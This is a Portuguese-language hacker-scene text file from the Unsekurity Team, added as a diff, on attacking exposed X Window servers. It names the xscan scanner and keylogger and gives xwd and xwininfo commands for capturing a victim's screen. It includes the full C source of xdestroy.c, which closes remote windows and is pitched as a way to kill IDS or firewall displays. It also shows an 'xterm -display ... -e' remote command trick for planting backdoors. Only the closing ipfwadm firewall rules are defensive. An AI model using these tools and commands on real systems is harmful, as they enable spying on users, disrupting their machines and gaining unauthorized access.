@@ -1,0 +1,482 @@
+#########################################################################
+########################## UNSEKURITY SCENE #############################
+#########################################################################
+
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Estes e outros artigos podem obtidos em:
+http://unsekurity.virtualave.net/ ou
+http://coracaodeleao.virtualave.net/
+
+
+OBS: Todo material contido neste arquivo texto possui somente propositos
+     educacionais.O autor nao se responsabiliza pelo mau uso das informacoes
+     e dados aqui fornecidos.
+
+OBS2: Elites que se fecham em reunioes 'infrutiferas', que nao se expoem
+      a usuarios mais leigos que possuem a mesma sede de conhecimento, nao
+      leia nenhuma linha deste simples txt! 'Elites' ou 'pseudo-elites'
+      que alteram home pages, praticam DDoS, disseminam virus e usam
+      a arrogancia como 'caracteristica' maior, favor nao ler!! Sua
+      incapacidade nao o deixarah enxergar as coisas 'ocultas' deste txt!
+
+
+                    **********************************
+                    *    INSEGURANCA NO XWINDOWS     *
+		    **********************************
+
+
+------------------------------- INDICE ----------------------------------
+
+1. INTRODUCAO
+2. ASPECTOS DE CONFIGURACAO
+3. FERRAMENTAS 
+   3.1 - Scaneando Servidores e Logkey
+   3.2 - Obtendo Informacoes de Servidores
+   3.3 - Capturando Tela
+   3.4 - Fechando Janelas Alheias
+   3.5 - Ganhando Acesso Shell
+   3.6 - Sugestoes
+4. TERMINANDO
+   4.1 - Links e Referencias.
+   4.2 - Consideracoes Finais.
+
+---------------------------------------------------------------------------
+
+--------------
+1. INTRODUCAO |
+--------------
+
+Bom irmaos, como todo mundo jah sabe.. o linux tem tido um crescimento
+muito grande ultimamente... Varias sao as distribuicoes, varios sao os
+tipos e varios sao os alvos das distribuicoes... Entre esses alvos,
+encontram-se os usuarios comuns.O que eu chamo de usuario comum, diz
+respeito aqui, a grande massa de pessoas que buscam usar linux com
+diversos motivos, mas que nao procuram conhecer o sistema a fundo.
+
+Os usuarios comuns procuram usar de inicio um linux da forma mais
+simples possivel, ou seja, evitam ao maximo a complicacao.. No entanto,
+evitando a complicacao, os usuarios comum terminam entrando numa
+estrada desconhecida e muitas vezes perigosa.Existem varios problemas
+de configuracao padrao e varios problemas que podem ser ocasionado no
+uso de determinados programas.Vou enumerar um dos problemas mais comuns
+encontrados hoje em dia.Os perigos existentes com o mau uso do Xwindows
+e a sua mah configuracao.
+
+----------------------------
+2. ASPECTOS DE CONFIGURACAO |
+----------------------------
+
+Todo mundo deve ter conhecimento que o Xwindows por sih soh nao eh uma
+aplicacao segura.Em varios sistemas ele vem configurado de forma erronea.
+A gente ve muita discussao rolar em mail lists, mas o pessoal parece que
+nao quer ir a fundo em determinados esquemas(problemas).Em redes locais
+se torna ateh trivial brincar com o Xwindows alheio.
+
+Muita gente costuma embelezar seu Xwin e enviar suas "Themes" p/ concursos
+ou mesmo p/ divulgar a beleza que pode se tornar uma interface grafica
+do linux! Dezenas de pessoas veem isso como uma forma de ficar famoso.
+No entanto o universo de usuarios do Linux eh cada vez maior, e a grande
+massa costuma usar o Xwin em todas as tarefas e em toda a navegacao pela
+Internet.Eu particularmente uso muito pouco, pois alem de saber os
+perigos que este aplicativo gera, nao vejo muita utilidade p/ um fucador
+usar Xwindows! Verdadeiramente, espero com este texto alertar aos
+fucadores para que procurem ficar mais no modo console(texto) e usar o
+Xwindows quando for estritamente necessario! Eh comodo lermos arquivos
+.pdf e .ps no xwindows, navegar usando lynx eh mais seguro do que
+Netscape, ao meu ver, verdadeiramente, abrir uma porta indesejada no
+meu computador nao eh uma das coisas que eu gosto muito!:)
+
+Na maioria dos sistemas Linux, quando se executa o Xwindows, a porta
+6000 eh automaticamente aberta.Fala-se como solucao a execucao do
+Xwindows com o parametro '-nolisten', mas em muitos casos, este 
+parametro nao funciona, a porta continua escutando a espera de conexoes.
+
+O universo de usuarios do Linux que deixam esta porta aberta eh
+verdadeiramente impressionante.Fiquem calmos, amigos do IRC, nao
+bisbilhotei os dados de vcs!:)..
+
+A realidade eh que qualquer porta aberta representa um perigo consideravel
+a atividades maliciosas.Nao importa qual servico seja e nem qual protocolo,
+se a porta estah aberta, existe uma chance consideravel de um fucador ou
+mesmo um cracker obter vantagem em cima dela.
+
+Se o comando 'telnet alvo 6000' indicar a porta aberta e sem filtragem,
+existe uma condicao muito grande de 'monitorarmos' o que um determinado 
+usuario estah fazendo.Nota-se que muitas pessoas nem se quer sabem que
+o Xwindos abre uma porta padrao.
+
+---------------
+3. FERRAMENTAS |
+---------------
+
+Descreverei de forma basica, algumas ferramentas usadas por fucadores
+p/ obter vantagens em cima do Xwindows.
+
+3.1 - Scaneando Servidores e LogKey
+--------------------------------------
+
+O primeiro passo p/ tentarmos uma investida num servidor alvo eh vermos
+se ele realmente possui uma porta 6000(ou qualquer outra como 6001, 6002
+e etc) em condicoes de nos 'ceder' informacoes.Isto ocorre quando o 
+sistema estah configurado com o parametro 'xhost +', por exemplo.Deste modo,
+nao soh a rede interna possui acesso ao servidor Xwindows, mas todo e
+qualquer host na Internet. Existem varios programas que dao uma scaneada a
+procura de servidores com porta 600X aberta sendo o proprio 'Nmap do Fyodor' 
+uma alternativa. Mas, existe um programa especifico que jah checa se ha 
+realmente a condicao de 'fucarmos' na porta do Xwindows, ele eh o amplamente 
+difundido 'xscan'!
+
+localhost:~$ ./xscan
+Usage: ./xscan <host> | <subnet> [[<host>] [<subnet>] ...]
+
+e.g.
+ ./xscan www.microsoft.com
+ ./xscan 129.23.4
+
+Alem de ser um programa simples de usar, ele tambem eh um programa
+simples em toda sua essencia.Voce poderia automatizar ele para que 
+o informe quando uma porta esta sendo filtrada por um firewall ou
+TCPWrapper.O xscan tambem possui outra particularidade, ou seja, ele
+loga o que a vitima digitar, sendo um perigoso programa capaz de
+capturar senhas, contas, enderecos acessados e etc.
+
+Procure-o em http://packetstorm.securify.com/.
+
+
+3.2 - Obtendo Informacoes de Servidores
+----------------------------------------
+
+Se eh interessante a possibilidade de obtermos acesso ao que o
+usuario estah digitando, nos podemos ir mais longe e verificarmos o
+que a sua tela estah exibindo, ou seja, capturarmos informacoes sobre
+quais programas ele estah executando e ter uma ideia do que Xwindows
+estah executando.Para conseguirmos isso, podemos executar um programa
+jah disponivel no Slack 7.0:
+
+/usr/X11R6/bin/xwininfo
+
+o 'xwinfo' nos fornece informacoes sobre o Xwindows do alvo.Abaixo nos
+vemos uma saida dele:
+
+localhost:~$ xwininfo -root -all -display 127.0.0.1:0 >> xwin.info
+
+Redirecionamos a saida p/ o arquivo 'xwin.info' e depois a analisamos:
+
+localhost:~$ pico xwin.info
+
+
+xwininfo: Window id: 0x2a (the root window) (has no name)
+
+  Root window id: 0x2a (the root window) (has no name)
+  Parent window id: 0x0 (none)
+     33 children:
+     0x800144 (has no name): ()  640x2+0+478  +0+478
+     0x800143 (has no name): ()  2x476+638+2  +638+2
+     0x80017b (has no name): ()  630x463+10+17  +10+17
+        14 children:
+        0x80017c (has no name): ()  620x436+5+22  +15+39
+           1 child:
+           0x280005b "gv 3.5.8": ("gv" "GV")  620x436+0+0  +15+39
+              1 child:
+              0x280005c (has no name): ()  620x436+0+0  +15+39
+                 27 children:
+                 0x2800080 (has no name): ()  72x25+8+8  +23+47
+                 0x280007f (has no name): ()  45x25+88+8  +103+47
+....
+....
+        1 child:
+        0xc00018 "FvwmButtons": ("FvwmButtons" "FvwmButtons")  605x68+0+0  +$
+        9 children:
+...
+...
+              0x1c00009 "xclock": ("xclock" "XClock")  51x52+2+2  +29+377
+
+....
+
+Enfim, a saida nos fornece diversas informacoes sobre o Xwindows, como
+por exemplo, que o programa GhostView(gv 3.5.8) estah sendo executado.
+Com um pouco de conhecimentos basicos sobre o sistema em questao, pode-se
+obter muita informacao usando esta ferramenta.
+
+3.3 - Capturando Tela
+----------------------
+
+As coisas jah parecem bem claras agora e o perigo realmente existe se
+nao formos cuidadosos.Vimos que se pode capturar informacoes sobre a
+janela, que se pode capturar as teclas que estao sendo digitadas, agora
+veremos que se pode capturar a tela como um todo.Para isso, precisamos
+executar uma outra ferramenta que acompanha os pacotes do Xwindows:
+
+/usr/X11R6/bin/xwd
+
+localhost:~$ xwd -root -display 127.0.0.1:0 > teladavitima
+
+Teremos um arquivo chamado 'teladavitima' com a tela capturada do
+host alvo.Depois, tudo que precisamos fazer eh usarmos o programa 'xv'
+(XView) do nosso Xwindows e iremos ver na nossa frente, na nossa maquina,
+a tela capturada do sistema alvo.Esta tecnica usada em conjunto com a
+captura de teclas digitadas(keylogger) produz uma perigosa ferramenta
+de captura de dados!
+
+Com esta tecnica, muitos usuarios leigos estao a merce de serem vitimas.
+Verdadeiramente, eh possivel capturarmos os themes de muitos 'pseudo-hackers'
+que nao soh buscam fama publicando seus themes, mas tambem visitam sites
+improprios p/ criancas!:)...
+
+Mas isso nao interessa a verdadeira comunidade de fucadores, o que de
+fato nos interessa eh obter acesso a servidores!! E acredite, eh possivel
+implementarmos uma tecnica dessas p/ tirarmos proveito! Muitos Servidores
+nao dao a devida atencao a este problema.
+
+
+3.4 - Fechando Janelas Alheias
+-------------------------------
+
+Podemos tambem fechar janelas.. Isto p/ alguns pode 'soar' como
+brincadeira, afinal, a maioria considera inutil programas DoS e que
+derrubam servicos! Isso, irmao, derrubam servicos, logo p/ voce que eh um
+fucador e sabe que toda e qualquer possibilidade de obter vantagem eh bem
+vinda, o fechamento de janelas pode vir a ser util!
+
+Se um servidor estah executando uma determinada ferramenta IDS, ou mesmo
+um firewall, uma ferramenta de log em FTP, por exemplo.. Voce poderah
+fechar a janela e derrubar o servico em execucao, em muitos casos, com
+a derrubada da janela, voce poderah estar apto a alcancar algo que nao
+poderia se a janela estivesse aberta! Enfim, cada caso eh um caso, e o
+fechamento de janelas pode vir a ser verdadeiramente util em alguma
+investida.
+
+Abaixo segue um codigo capaz de fazer isto:
+
+------------------------ xdestroy.c ---------------------------
+/* xdestroy.c
+ * Destroys all windows in an X display
+ *
+ * Usage:       ./xdestroy hostname:0 <option>
+ * Compile:     gcc -lX11 -lm -o xdestroy xdestroy.c
+ *       or     gcc -L/usr/X11R6/lib -lX11 -lm -o xdestroy xdestroy.c
+ *
+ *
+ *      blasphemy (cornoil@netscape.net)
+ */
+
+#include <stdio.h>
+#include <X11/X.h>
+#include <X11/Xlib.h>
+
+int
+main(argc, argv)
+int argc;
+char *argv[];
+{
+  Display *remote_display;
+  Window r, p, *c;
+  unsigned int nc, x;
+
+  printf("xdestroy.c by blasphemy | fred_\n");
+
+  if (argc < 3)
+    {
+      fprintf(stderr,
+              "usage: %s [hostname:0] [option]\n"
+              "Options:\n\t-d\tDestroy all windows\n"
+              "\t-s #\tDestroys a specific window\n", argv[0]);
+
+      exit(1);
+    }
+
+  if ((remote_display = XOpenDisplay(argv[1])) == NULL)
+    {
+      fprintf(stderr,
+              "can't open Display: %s\n", argv[1]);
+
+      exit(1);
+    }
+  else
+    {
+
+      printf("connected.. ");
+    }
+
+  r = DefaultRootWindow(remote_display);
+  XQueryTree(remote_display,
+             r,
+             &r,        /* root */
+             &p,        /* parent */
+             &c,        /* children */
+             &nc);      /* number of children */
+
+  /* I didn't use getopt() cause I'm to lazy */
+
+  if (strcmp(argv[2], "-d") == 0)
+    {
+      printf("destroying all %d windows\n", nc);
+
+      for (x = 0; x < nc; x++)
+        XDestroyWindow(remote_display, c[x]);
+
+    }
+  else if (strcmp(argv[2], "-s") == 0)
+    {
+      printf("destroying window %d\n", atoi(argv[3]));
+
+      x = atoi(argv[3]);
+      if (x > nc)
+        {
+          printf("No such window!\n");
+          XCloseDisplay(remote_display);
+          exit(1);
+        }
+      else
+        XDestroyWindow(remote_display, c[x]);
+    }
+  else
+
+    printf("Unknown option\n");
+
+  XCloseDisplay(remote_display);
+
+  return(0);
+}
+------------------------------------------------
+
+3.5 - Ganhando Acesso Shell
+----------------------------
+
+As coisas nao sao realmente boas para quem nao dah a devida atencao a
+seguranca! Obter acesso shell eh trivial em uma rede local, 'aberta' p/
+todo mundo, ou mesmo setada com 'xhost +'.O xterm eh uma ferramenta 
+responsavel pela abertura de um terminal em um servidor Xwindows.Mas
+ele tambem pode executar comandos 'remotos' para nos.
+
+Eu estou desenvolvendo com o module uma ferramenta que automatiza as
+coisas p/ a gente, mas enquanto ela nao chega, o xterm pode fazer o 
+trabalho pesado p/ nos.
+
+Varios sao os possiveis esquemas e dependendo da situacao, o nivel de
+dificuldade pode ser inexistente ou mesmo a coisa pode esquentar! Soh
+fucando na rede alvo poderemos ter um 'prognostico' de como de fato as
+configuracoes sao!
+
+Um Exemplo do uso de xterm, pode ser em uma rede local.
+
+$ xterm -display [IP Local]:0.0 -e comando
+
+Podendo comando ser um shellscript com varias instrucoes, permitindo ateh
+mesmo a contrucao de backdoors.Dependendo da situacao a janela poderah ficar 
+aberta por muito tempo, aih voce precisa raciocinar se haverah alguem na 
+frente da maquina quando voce executar isto ou nao.Os fucadores sabem que o 
+melhor horario p/ fucar eh dia de semana, na parte da madrugada!!! Logico que 
+isto depende do alvo, mas eu mesmo jah trabalhei final de semana no periodo 
+de madrugada p/ um provedor e conheco pessoas que nao dormiam!:)
+
+
+3.6 - Sugestoes
+----------------
+
+O cenario p/ execucao desta tecnica tende a variar muito.Uma maquina
+pode obter acesso remoto ao Xwindows, pode obter acesso local e em
+alguns casos, nao pode obter eh nada! Assim como em toda tecnica fucadora,
+esta requer que o fucador procure conhecer na pratica se existe a 
+condicao de execucao da tecnica! Os conceitos demonstrados aqui nao sao
+novos e muitos sistemas estao aplicando mais ferramentas de seguranca
+e novos conceitos p/ dificultar mais ainda a implementacao desta tecnica.
+Eu falei muita coisa e disponibilizei algum material na mail list do
+Unsekurity Team, e quem nao estah participando nao sabe o que estah
+perdendo! Quanto maior a troca de informacoes entre pessoas dispostas
+a trocar informacoes, maiores sao os cenarios imaginados e 'vencidos'
+antes mesmo da implementacao da tecnica!
+
+--------------
+4. TERMINANDO |
+--------------
+
+Como eu sei que muitos dos que estao lendo este artigo nao conhecem
+este problema(lembrem-se que ele eh amplamente difundido na Internet),
+vou postar uma solucao visando aumentar a seguranca de um XWindows.
+
+Basta executar as linhas abaixo:
+
+/sbin/ipfwadm -I -a deny -P tcp -o -S 0.0.0.0/0 -D 0.0.0.0/0 6000:6000
+/sbin/ipfwadm -I -a deny -P udp -o -S 0.0.0.0/0 -D 0.0.0.0/0 6000:6000
+
+Usando o 'ipfwadm' que eh o firewall do linux, procura-se deste modo
+fechar a porta 6000 de acessos via 'tcp' e 'udp'.
+
+As tecnicas descritas e suas implementacoes quase que se tornam ineficazes
+quando as linhas acima sao executadas! Bastante atencao nisto tudo.
+
+Existe muito o que ser dito sobre Xwindows.Muitos programas do Xwindows
+sao vulneraveis a buffer overflows, race conditions e etc.Uma pesquisa
+incessante em prol de obtencao de conhecimento tem que ser levada a serio.
+Ferramentas como 'xdm' estao se tornando cada vez mais comuns, mas os
+seus conceitos tambem sao falhos! Talvez num futuro breve, eu faca mais
+um artigo detalhando mais coisas a respeito de 'Inseguranca no Xwin',
+mas cabe a voce, irmao NewBie ir mais longe e pesquisar mais sobre o
+assunto!
+
+4.1 - Links e Referencias
+--------------------------
+
+* Home Page Atual do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+
+* Outros Links Interessantes:
+
+http://www.taldowin.com.br/
+http://www.hacker.com.br/
+http://www.absoluta.org/
+http://www.securenet.com.br/
+
+4.2 - Consideracoes Finais
+---------------------------
+
+Este texto foi originalmente escrito p/ a mail list do Unsekurity Team,
+sendo depois portado p/ publicacao nos sites.. A lista tem fluido com
+boas discussoes, nao soh eticas, mas tambem tecnicas.. Como o publico
+alvo da mail list eh o pessoal 'NewBie Fucador', muita coisa de nivel
+realmente tem sido discutida! Alguns textos falando sobre Xwindows e
+Seguranca no mesmo foram publicados por lah.Nao tenho os links p/ o
+mesmo, mas assim que tiver, eu posto no Forum.O Interessante seria que
+cada leitor assinasse e participasse da mail list, demonstrando sua
+opiniao e contribuindo com a troca de informacoes.
+
+Os passos que o Unsekurity tem dado sao grandiosos, e cada vez mais,
+mais e mais pessoas estao comecando a ver as coisas referente a um
+hacking verdadeiro e nao-elitista! Pessoas dispostas a trocarem informacoes
+e proverem conhecimentos, pessoas que realmente possuem um espirito
+hacker enraizado em seus coracoes e que nao visam praticar o mal ao
+proximo! 
+
+O repudio as atividades de crackers e script kiddies tem aumentado a
+medida que as pessoas vem obtendo um maior conhecimento! Quanto mais
+conhecimento elas obtem, com os olhos mais claros elas passam a enxergar
+acoes que visam destruir dados, alterar home pages, disseminar virus,
+tudo em prol da obtencao de fama.
+
+O tempo tem passado e eh realmente impressionante o quanto a liberdade
+de informacao eh capaz de 'mudar mentes'! Quanto mais pessoas se engajarem
+em discutir e acima de tudo informar as 'mazelas das grandes empresas',
+o monopolio da informacao, a 'inocencia dos kiddies', e demais assuntos
+referente ao mundo dos fucadores, mais forte os fucadores verdadeiros
+ficarao em todos os sentidos e mais plena serah a uniao dos verdadeiros
+fucadores!
+
+Agradeco a todos aqueles que de fato tem lutado em prol de uma maior
+liberdade de informacao, e aqueles que como eu, tem tentado tornar manifesto
+as acoes de alguns grupos que se 'auto-denominam elites' e da banda podre
+de comunidade de seguranca de um modo geral! Esta luta eh nossa, e cada
+um que participa ou participou possui o meu respeito!!
+
+Um abraco.
+
+
+						Nash Leon.
+
+------------------------------- EOF -----------------------------------
+
+
